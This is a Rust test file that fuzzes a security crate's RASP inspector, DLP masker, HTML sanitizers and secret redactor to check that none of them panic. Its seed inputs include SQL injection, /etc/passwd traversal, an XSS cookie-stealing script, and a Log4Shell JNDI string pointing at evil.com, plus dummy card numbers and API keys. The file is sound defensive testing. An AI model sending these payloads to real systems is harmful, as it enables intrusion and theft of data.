use rullst_security::dlp::mask_response_payload;
use rullst_security::log_redactor::redact_secrets;
use rullst_security::rasp::RaspInspector;
use rullst_security::sanitizer::HtmlSanitizer;
use rullst_security::schema_guard::inspect_json_payload;

#[test]
fn test_fuzz_rasp_inspector_zero_panics() {
    let mut rng_seed: u64 = 0x1337_cafe_babe;
    let mut lcg = || {
        rng_seed = rng_seed.wrapping_mul(6364136223846793005).wrapping_add(1);
        (rng_seed >> 32) as u32
    };

    let base_payloads = [
        "SELECT * FROM users WHERE id = 1",
        "' OR '1'='1",
        "../../../../etc/passwd",
        "<script>alert(document.cookie)</script>",
        "UNION ALL SELECT null, null, username, password FROM users--",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "\0\0\0\x7f\u{00ff}\u{00fe}\u{00aa}\x55",
        "𝕾𝕼𝕷_𝕴𝕹𝕵𝕰𝕮𝕿𝕴𝕺𝕹",
    ];

    for _ in 0..5_000 {
        let base = base_payloads[(lcg() as usize) % base_payloads.len()];
        let mut mutated = String::with_capacity(base.len() + 32);

        for b in base.bytes() {
            let roll = lcg() % 10;
            match roll {
                0 => mutated.push((lcg() % 256) as u8 as char),
                1 => mutated.push_str("%20"),
                2 => mutated.push('\0'),
                3 => mutated.push('\''),
                4 => mutated.push('"'),
                5 => mutated.push_str("/**/"),
                _ => mutated.push(b as char),
            }
        }

        // Must never panic
        let _ = RaspInspector::inspect_uri(&mutated);
        let _ = RaspInspector::inspect_text(&mutated);
    }
}

#[test]
fn test_fuzz_dlp_masking_zero_panics() {
    let mut rng_seed: u64 = 0xdead_beef_f00d;
    let mut lcg = || {
        rng_seed = rng_seed.wrapping_mul(6364136223846793005).wrapping_add(1);
        (rng_seed >> 32) as u32
    };

    let sample_cards = [
        "4532-0150-1234-5678",
        "123.456.789-00",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.doNotLeak",
        "sk_live_51MzE49J2kd9A8172bcas91",
        "normal text with no secrets here",
    ];

    for _ in 0..3_000 {
        let base = sample_cards[(lcg() as usize) % sample_cards.len()];
        let mut input = format!("{}-{}", base, lcg());
        if lcg() % 2 == 0 {
            input.push_str("\0\n\r\t");
        }

        // Must never panic
        let masked = mask_response_payload(input.as_bytes());
        assert!(!masked.0.is_empty() || input.is_empty());
    }
}

#[test]
fn test_fuzz_sanitizers_zero_panics() {
    let mut rng_seed: u64 = 0xbeef_cafe_4242;
    let mut lcg = || {
        rng_seed = rng_seed.wrapping_mul(6364136223846793005).wrapping_add(1);
        (rng_seed >> 32) as u32
    };

    for _ in 0..3_000 {
        let len = (lcg() % 64) as usize;
        let mut random_str = String::with_capacity(len);
        for _ in 0..len {
            let ch = match lcg() % 6 {
                0 => ';',
                1 => '-',
                2 => '\'',
                3 => '"',
                4 => '<',
                _ => ((lcg() % 26) as u8 + b'a') as char,
            };
            random_str.push(ch);
        }

        let _ = HtmlSanitizer::sanitize(&random_str);
        let _ = HtmlSanitizer::sanitize_text(&random_str);
        let _ = redact_secrets(&random_str);
        let _ = inspect_json_payload(random_str.as_bytes(), 32, 2 * 1024 * 1024);
    }
}
